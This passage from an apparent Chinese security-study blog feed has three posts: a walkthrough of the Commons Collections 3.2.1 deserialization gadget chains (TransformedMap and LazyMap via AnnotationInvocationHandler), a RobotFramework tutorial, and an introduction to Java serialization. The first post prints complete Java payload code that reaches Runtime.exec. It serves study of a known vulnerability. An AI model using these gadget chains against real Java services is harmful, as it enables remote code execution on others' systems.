<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; tmp = TransformedMap.decorate(map,transformerChain, transformerChain);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;Object,Object&gt; entry: tmp.entrySet())&#123;</span><br><span class="line">    entry.setValue(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想办法传入恰当参数使得<code>readObject</code>方法可以执行该<code>setValue</code>方法，回到<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法，我们需要确保能进入<code>memberType!=null</code>才能继续向下执行</p><p><img src="/post/4ffaad89/image-20240609202106159.png" alt="image-20240609202106159" style="zoom:33%;"></p><p>找到memberType的来源</p><p><img src="/post/4ffaad89/image-20240609202756792.png" alt="image-20240609202756792" style="zoom:33%;"></p><p>找到type的来源，是个注释类，并且要求该注释类有从memberValues键值对中获取到的键，memberValues是我们可控制的，因此需要找到有键的注释类</p><p><img src="/post/4ffaad89/image-20240609202826270.png" alt="image-20240609202826270" style="zoom:33%;"></p><p>此处选择Target类，有键value</p><p><img src="/post/4ffaad89/image-20240609202954612.png" alt="image-20240609202954612" style="zoom:33%;"></p><p><code>memberValues</code>传入的键值对中的键应是<code>value</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是此处<code>setValue</code>中的对象我们难以控制，而这里<code>setValue</code>中的对象相当于是要传递给<code>transformerChain</code>的<code>transform</code>方法，该方法会依次执行<code>transformerChain</code>数组中的<code>InvokerTransformer</code>对象的<code>transform</code>方法，因此此处选择在数组中再增加一对象，使得无论传什么参都能正确返回第一个结果，只要第一个结果正确，后面肯定会依次执行，也就是此处的<code>ConstantTransformer</code>类</p><p><img src="/post/4ffaad89/image-20240609203343324.png" alt="image-20240609203343324" style="zoom:50%;"></p><p>由此，整体构造代码如下，用反射的方式获取AnnotationInvocationHandler对象是因为该方法不是public对象，不能直接在外部实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; tmp = TransformedMap.decorate(map,transformerChain, transformerChain);</span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, tmp);</span><br><span class="line">serialize(instance);</span><br><span class="line">unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="进阶2">进阶2</h5><p>选择使用lazyMap类的get方法</p><blockquote><p><code>LazyMap</code> 是一种装饰模式的实现，它包装了另一个<code>Map</code> 对象，并添加了按需创建对象的功能。当通过<code>get(Object key)</code> 方法访问一个不存在于 <code>Map</code>中的键时，它会使用一个工厂对象来创建该键对应的值，并将其放入<code>Map</code> 中。</p></blockquote><p>此处的<code>factory</code>是可控制的，并且此处的<code>key</code>是不需要定义的，此处的<code>transform</code>方法并不会使用传入的参数<code>key</code></p><p><img src="/post/4ffaad89/image-20240611142611958.png" alt="image-20240611142611958" style="zoom: 50%;"></p><h6 id="确定能执行get方法的漏洞点">确定能执行get方法的漏洞点</h6><p>此处选择的是AnnotationInvocationHandler类的invoke方法，因为上面已经分析了memberValues（Map）对象是可控制的，而在此处调用了memberValues对象的get方法</p><p><img src="/post/4ffaad89/image-20240611142745004.png" alt="image-20240611142745004" style="zoom: 33%;"></p><p>因此我们想办法使得AnnotationInvocationHandler的readObject方法调用此处的invoke方法，而此处调用enrtySet方法刚好满足条件，只要memberValues是AnnotationInvocationHandler类的代理对象，当memberValues调用该方法时，就会自动调用AnnotationInvocationHandler的invoke方法，最终实现该链</p><p><img src="/post/4ffaad89/image-20240611142831708.png" alt="image-20240611142831708" style="zoom:33%;"></p><h6 id="代码构造-1">代码构造</h6><p>memberValues就变成了AnnotationInvocationHandler的代理对象，并且由于传参限制，必须是Map类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map tmplazymap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, tmplazymap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Override.class, proxyInstance);</span><br><span class="line">serialize(instance);</span><br><span class="line">unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="总结">总结</h5><p>下图是这两个链子的流程图，都是找调用transform方法的类</p><ul><li>进阶一找的是<code>TransformedMap</code>的<code>checkValue</code>方法，然后在<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法中能实现调用<code>checkValue</code>方法，通过传入构造的<code>TransformedMap</code>对象，构造的<code>TransformedMap</code>对象会传入构造的<code>ChainedTransformed</code>对象，最终实现<code>ChainedTransformed</code>的<code>transform</code>方法的调用</li><li>进阶二找的是LazyMap的get方法，原理是<code>AnnotationInvocationHandler</code>类中的<code>invoke</code>方法实现了调用<code>get</code>方法，因此想办法使得<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法中能实现调用其<code>invoke</code>方法，因此传入对象为<code>AnnotationInvocationHandler</code>类的实例，实例调用函数一定会调用该实例的<code>invoke</code>方法来调用实例，进而实现<code>get</code>方法调用</li></ul><p><img src="/post/4ffaad89/image-20240611141535037.png" alt="image-20240611141535037" style="zoom: 67%;"></p>]]></content>
    
    
    <summary type="html">&lt;h6 id=&quot;前景提要&quot;&gt;前景提要&lt;/h6&gt;
&lt;p&gt;jdk版本：8u65 下载链接：&lt;a href=&quot;https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html&quot;&gt;Java
存档下载 — Java SE 8 | Oracle 中国&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;cc版本：3.2.1&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;3.2.1&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip下载到的zip文件中的src/share/classes目录下的sun添加到jdk_8u65/目录下的src.jar解压后的src文件中，再将src/目录添加到项目的sdk源路径中，可实现将class文件转换为java（方便调试）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/post/4ffaad89/image-20240608170247917.png&quot; alt=&quot;image-20240608170247917&quot; style=&quot;zoom:50%;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RF_study</title>
    <link href="http://example.com/post/887fb1e7.html"/>
    <id>http://example.com/post/887fb1e7.html</id>
    <published>2024-06-05T06:40:37.000Z</published>
    <updated>2024-09-28T16:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="robotframework">RobotFramework</h2><p>基于<strong>关键字驱动</strong>的一种自动化测试框架，能够完美地对WebUI,APPUI,接口实现自动化测试，不需要编写代码，本身基于RF自定义的表格编写语法的形式来实现的工具的自动化测试</p><span id="more"></span><p>不同的测试项，需要不同的库来支撑，WebUI基于Selenium，APPUI基于Appium,接口基于requests</p><p><strong>数据驱动</strong>：把测试用例数据放到excel/yaml里面，然后通过改变excel、yaml文件里面的数据，达到控制测试用例的执行的过程。</p><p><strong>关键字驱动</strong>：把项目中的一些业务逻辑或基本的操作封装成一个一个的关键字然后去调用不同的关键字，或者是关键字的组合，去实现一些不同的业务逻辑</p><p>特点：</p><ol type="1"><li>方便，可以以robot,txt,tsv,html等格式</li><li>可以自动生成html格式的测试报告</li><li>自带很多类库，支持很多扩展库</li><li>可以根据业务需要去自定义关键字（登录、下订单、评论）支持中文</li><li>支持非GUI方法运行，可以和jenkins持续集成</li></ol><h5 id="ride基本使用">Ride基本使用</h5><p><strong>项目--模块--子模块--测试套件--测试用例</strong></p><h6 id="测试套件suite">测试套件(suite)</h6><ul><li>Edit标签：<ul><li>Setting：设置 （Document:描述 Suite Setup:测试套件之前的关键字 SuiteTeardown:测试套件之后的关键字 Test Setup:套件用例之前的关键字 TestTeardown:套件用例之后的关键字 Test Template:测试模板 TestTimeout:超时时间 Force Tags:强制标记）</li><li>加载外部文件（扩展库，资源文件，变量文件，帮助文档）</li><li>定义内部变量</li><li>定义元数据</li></ul></li><li>Test Edit标签：</li><li>Run标签：运行</li></ul><h6 id="测试用例">测试用例</h6><ul><li>Edit标签：<ul><li>Setting：设置 （Document:描述 Setup:测试用例之前的关键字Teardown:测试用例之后的关键字 Template:测试模板 Timeout:超时时间Tags:标记）</li><li>加载外部文件（扩展库，资源文件，变量文件，帮助文档）</li><li>定义内部变量</li><li>定义元数据</li></ul></li><li>Test Edit标签：</li><li>Run标签：运行<ul><li>Only run tests with these tags(跳过)</li><li>skip tests with these tags(跳过)</li></ul></li></ul><h5 id="rf类库和扩展库">RF类库和扩展库</h5><ol type="1"><li>标准库（RF自带，不需要额外安装）：<ul><li>buitln（测试库）</li><li>Collection(集合库)</li><li>DataTime(时间库)</li><li>screenshot(截屏库)</li><li>......</li></ul></li><li>扩展库(需要通过pip命令额外安装)，不同的测试需要不同的库<ul><li>web自动化测试：SeleniumLibrary</li><li>接口自动化测试：RequestsLibrary</li><li>app自动化测试：APPiumLibrary</li></ul></li></ol><h5 id="rf的基本使用">RF的基本使用</h5><h6 id="关键字">关键字</h6><ul><li><p>Log:打印</p></li><li><p>${a} 12:设置变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*** Settings ***</span><br><span class="line">Library    DateTime</span><br><span class="line">*** Keywords ***</span><br><span class="line">*** Variables ***</span><br><span class="line">$&#123;a&#125;   0</span><br><span class="line">*** Test Cases ***</span><br><span class="line">TEST1</span><br><span class="line">    Log    $&#123;a&#125;</span><br></pre></td></tr></table></figure></li><li><p>catenate:字符串拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*** Settings ***</span><br><span class="line">Library    DateTime</span><br><span class="line">*** Keywords ***</span><br><span class="line">*** Variables ***</span><br><span class="line"></span><br><span class="line">*** Test Cases ***</span><br><span class="line">TEST1</span><br><span class="line">    $&#123;str&#125;  catenate   1   2   3</span><br><span class="line">    Log    $&#123;str&#125;</span><br></pre></td></tr></table></figure></li><li><p>Create List:创建列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*** Settings ***</span><br><span class="line">Library    DateTime</span><br><span class="line">Library    Collections</span><br><span class="line"></span><br><span class="line">*** Keywords ***</span><br><span class="line">*** Variables ***</span><br><span class="line"></span><br><span class="line">*** Test Cases ***</span><br><span class="line">TEST1</span><br><span class="line">    $&#123;list&#125;    Create List    1    2    3    4    5</span><br><span class="line">    Log    $&#123;list&#125;</span><br><span class="line">    @&#123;list&#125;    Create List    1    2    3    4    5</span><br><span class="line">    Log Many    @&#123;list&#125; #更适合做循环</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="/post/887fb1e7/image-20240605161858444.png" alt="image-20240605161858444" style="zoom:33%;"></p></li><li><p>常规关键字</p><ul><li><p>输出：<code>$&#123;dict&#125; = &#123;'key1': 'value1', 'key2': 'value2'&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*** Settings ***</span><br><span class="line">Library    DateTime</span><br><span class="line">Library    Collections</span><br><span class="line"></span><br><span class="line">*** Keywords ***</span><br><span class="line">*** Variables ***</span><br><span class="line"></span><br><span class="line">*** Test Cases ***</span><br><span class="line">TEST1</span><br><span class="line">    $&#123;dict&#125;    Create Dictionary    key1    value1    key2    value2</span><br><span class="line">    Log    $&#123;dict&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取字典所有的key和value输出：<code>['key1', 'key2']   ['value1', 'value2']</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TEST1</span><br><span class="line">    $&#123;dict&#125;    Create Dictionary    key1    value1    key2    value2</span><br><span class="line">    # 获取字典所有的key</span><br><span class="line">    $&#123;keys&#125;    Get Dictionary Keys    $&#123;dict&#125;</span><br><span class="line">    Log    $&#123;keys&#125;</span><br><span class="line">    # 获取字典所有的value</span><br><span class="line">    $&#123;values&#125;    Get Dictionary Values    $&#123;dict&#125;</span><br><span class="line">    Log    $&#123;values&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取指定key的value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 获取指定key的value</span><br><span class="line">$&#123;value&#125;    Get From Dictionary    $&#123;dict&#125;    key1</span><br></pre></td></tr></table></figure></li></ul></li><li><p>复杂关键字</p><ul><li><p>执行python语句 输出：<code>$&#123;rand&#125; = 37</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TEST1</span><br><span class="line">    $&#123;rand&#125;    Evaluate    random.randint(1, 100)</span><br><span class="line">    Log    $&#123;rand&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行py文件里的方法</p><p><img src="/post/887fb1e7/image-20240605164228397.png" alt="image-20240605164228397" style="zoom:33%;"><img src="/post/887fb1e7/image-20240605164243888.png" alt="image-20240605164243888" style="zoom:33%;"><img src="/post/887fb1e7/image-20240605164303657.png" alt="image-20240605164303657" style="zoom:50%;"></p></li><li><p>if语句</p><p><img src="/post/887fb1e7/image-20240605164645024.png" alt="image-20240605164645024" style="zoom:33%;"><img src="/post/887fb1e7/image-20240605164635415.png" alt="image-20240605164635415" style="zoom:33%;"></p></li></ul></li></ul><h5 id="项目规范">项目规范</h5><p><strong>项目</strong>——init.txt(登陆获取restapi) -&gt;<strong>模块</strong>——init.txt(从表格中获取测试需要使用的全局变量，设置测试参数)-&gt;<strong>子模块</strong>——init.txt(还原测试环境（每次测试之后都会保存一些变量，重新测试需要删除这些保存的变量）)-&gt;测试文件（设置默认安全模板，如果是攻击测试，就回放攻击报文，检查是否正常告警）</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;robotframework&quot;&gt;RobotFramework&lt;/h2&gt;
&lt;p&gt;基于&lt;strong&gt;关键字驱动&lt;/strong&gt;的一种自动化测试框架，能够完美地对WebUI,APPUI,接口实现自动化测试，不需要编写代码，本身基于RF自定义的表格编写语法的形式来实现的工具的自动化测试&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化和反序列化</title>
    <link href="http://example.com/post/c3110923.html"/>
    <id>http://example.com/post/c3110923.html</id>
    <published>2024-03-26T06:58:23.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="java序列化和反序列化入门">Java序列化和反序列化入门</h2><p>参考视频：<a href="https://www.bilibili.com/video/BV16h411z7o9/?share_source=weixin&amp;vd_source=5ded3ec65465babadabcd69cfc28f3fe">Java反序列化漏洞专题-基础篇(21/09/05更新类加载部分)_哔哩哔哩_bilibili</a></p><span id="more"></span><h4 id="初始序列化和反序列化">初始序列化和反序列化</h4><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程</p><p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程</p><blockquote><p>序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p></blockquote><p>序列化函数是写文件，将序列化后的内容写到文件<code>ser.bin</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化函数是读文件，读取文件<code>ser.bin</code>文件中的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename)));</span><br><span class="line">    <span class="keyword">return</span> ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="举例说明">举例说明</h5><p>整体流程是首先定义了一个 <code>Person</code> 类，然后通过<code>serialize</code> 方法将 <code>Person</code>对象序列化到文件中，然后再通过 <code>unserialize</code>方法将文件中的数据反序列化为 <code>Person</code> 对象。</p><p>先构造一个 <code>Person</code> 类</p><p><img src="/post/c3110923/image-20240326153856780.png" alt="image-20240326153856780" style="zoom: 33%;"></p><p>先进行序列化生成 <code>ser.bin</code> 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>, <span class="string">&quot;1234 Main St&quot;</span>, <span class="string">&quot;555-1234&quot;</span>);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">    serialize(person);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ser.bin</code> 文件</p><p><img src="/post/c3110923/image-20240326154024774.png" alt="image-20240326154024774" style="zoom: 33%;"></p><p>然后进行反序列化输出 <code>ser.bin</code> 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出内容如下，说明是成功读取了文件流</p><p><img src="/post/c3110923/image-20240326154116092.png" alt="image-20240326154116092" style="zoom:50%;"></p><h6 id="关键说明">关键说明</h6><ul><li><p><strong>implement</strong></p><p>在person类中实现了一个接口，关键字<code>implements</code>用于声明一个类实现（implement）一个接口。</p><p><code>implements Serializable</code> 表示 <code>Person</code>类实现了 <code>Serializable</code> 接口。</p><blockquote><p><code>Serializable</code> 